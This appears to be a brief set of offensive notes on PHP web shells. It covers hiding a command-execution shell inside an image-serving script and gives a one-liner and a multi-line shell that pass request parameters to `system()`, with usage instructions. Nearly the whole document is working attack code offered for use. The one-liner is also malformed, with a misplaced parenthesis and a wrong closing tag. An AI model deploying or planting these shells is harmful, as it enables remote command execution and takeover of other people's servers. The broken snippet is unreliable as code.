# php webshells

## discussion

> php site using php to show images, we can hide an shell in an image

```php
if( isset( $_REQUEST['invae'] ) )
{
	system($_REQUEST['invae']);
}
die(); 
```

- `die()` removes the image garbage, making our shell easier to use
- `$_REQUEST` is more friendly towards bad characters and thus code execution


## prepared statements

### php request one liner

- usage: `GET` or `POST` request with data `shell.php?invae=ANYTHING&cmd=COMMAND`

```php
<?php  if( isset( $_REQUEST['invae'] ){ echo system( $_REQUEST['cmd'] ); } )/>
```


### php request multi-line

usage: `GET` or `POST` request with data `shell.php?invae=ANYTHING&cmd=COMMAND`

```php 
<?php
    if( isset($_REQUEST['invae']) )
    {
        echo system($_REQUEST['cmd']);
    }
?>
```

